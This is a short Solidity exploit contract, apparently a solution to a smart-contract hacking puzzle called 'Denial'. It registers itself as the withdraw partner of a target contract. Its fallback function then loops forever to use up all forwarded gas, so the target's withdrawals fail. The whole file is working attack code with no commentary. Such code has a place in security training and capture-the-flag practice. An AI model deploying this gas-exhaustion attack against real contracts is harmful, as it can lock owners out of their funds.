pragma solidity ^0.8.0;

interface IDenial {
    function setWithdrawPartner(address _partner) external;
}

contract GasSpender {
    function setPartner(address denial) public {
        IDenial(denial).setWithdrawPartner(address(this));
    }

    fallback() external payable {
        uint x = 1; // Prevent optimization
        uint y = 2;
        while (true) {
            x += y;
        }
    }
}